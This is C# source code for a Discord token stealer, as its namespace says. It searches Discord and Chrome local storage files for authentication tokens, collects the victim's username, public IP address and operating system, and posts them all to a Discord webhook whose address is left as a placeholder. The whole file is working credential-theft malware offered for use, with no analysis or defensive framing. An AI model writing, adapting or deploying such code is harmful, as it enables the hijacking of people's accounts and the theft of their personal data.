using System;
using System.Collections.Generic;
using System.IO;
using System.Management;
using System.Net;
using System.Text;

namespace Discord_Token_Stealer
{
    static class Program
    {
        static void Main()
        {
            #region grabbing token
            string string1 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local Storage\\leveldb\\";
            if (!dotldb(ref string1) && !dotldb(ref string1))
            {
            }
            System.Threading.Thread.Sleep(100);
            string string2 = tokenx(string1, string1.EndsWith(".log"));
            if (string2 == "")
            {
                string2 = "N/A";
            }

            string string3 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\";
            if (!dotldb(ref string3) && !dotlog(ref string3))
            {
            }
            System.Threading.Thread.Sleep(100);
            string string4 = tokenx(string3, string3.EndsWith(".log"));
            if (string4 == "")
            {
                string4 = "N/A";
            }
            #endregion

            //sending message to discord webhook
            using (DcWebHook dcWeb = new DcWebHook())
            {
                ManagementObjectSearcher mos = new ManagementObjectSearcher("select * from Win32_OperatingSystem");
                foreach (ManagementObject managementObject in mos.Get())
                {
                    String OSName = managementObject["Caption"].ToString();
                    dcWeb.ProfilePicture = "https://www.logolynx.com/images/logolynx/1b/1bcc0f0aefe71b2c8ce66ffe8645d365.png";
                    dcWeb.UserName = "Webhook";
                    dcWeb.WebHook = "YOURDISCORDWEBHOOK LINK"; 
                    dcWeb.SendMessage("```" + "UserName: " + Environment.UserName + Environment.NewLine + "IP: " + GetIPAddress() + Environment.NewLine + "OS: " + OSName + Environment.NewLine + "Token DiscordAPP: " + string2 + Environment.NewLine + "Token Chrome: " + string4 + "```");
                }
            }
        }

        #region grabbingIP
        public static string GetIPAddress()
        {
            string IPADDRESS = new WebClient().DownloadString("http://ipv4bot.whatismyipaddress.com/");
            return IPADDRESS;
        }
        #endregion

        #region stealingtoken
        private static bool dotlog(ref string stringx)
        {
            if (Directory.Exists(stringx))
            {
                foreach (FileInfo fileInfo in new DirectoryInfo(stringx).GetFiles())
                {
                    if (fileInfo.Name.EndsWith(".log") && File.ReadAllText(fileInfo.FullName).Contains("oken"))
                    {
                        stringx += fileInfo.Name;
                        return stringx.EndsWith(".log");
                    }
                }
                return stringx.EndsWith(".log");
            }
            return false;
        }
        private static string tokenx(string stringx, bool boolx = false)
        {
            byte[] bytes = File.ReadAllBytes(stringx);
            string @string = Encoding.UTF8.GetString(bytes);
            string string1 = "";
            string string2 = @string;
            while (string2.Contains("oken"))
            {
                string[] array = IndexOf(string2).Split(new char[]
                {
                    '"'
                });
                string1 = array[0];
                string2 = string.Join("\"", array);
                if (boolx && string1.Length == 59)
                {
                    break;
                }
            }
            return string1;
        }
        private static bool dotldb(ref string stringx)
        {
            if (Directory.Exists(stringx))
            {
                foreach (FileInfo fileInfo in new DirectoryInfo(stringx).GetFiles())
                {
                    if (fileInfo.Name.EndsWith(".ldb") && File.ReadAllText(fileInfo.FullName).Contains("oken"))
                    {
                        stringx += fileInfo.Name;
                        return stringx.EndsWith(".ldb");
                    }
                }
                return stringx.EndsWith(".ldb");
            }
            return false;
        }
        private static string IndexOf(string stringx)
        {
            string[] array = stringx.Substring(stringx.IndexOf("oken") + 4).Split(new char[]
            {
                '"'
            });
            List<string> list = new List<string>();
            list.AddRange(array);
            list.RemoveAt(0);
            array = list.ToArray();
            return string.Join("\"", array);
        }
        #endregion
    }
}
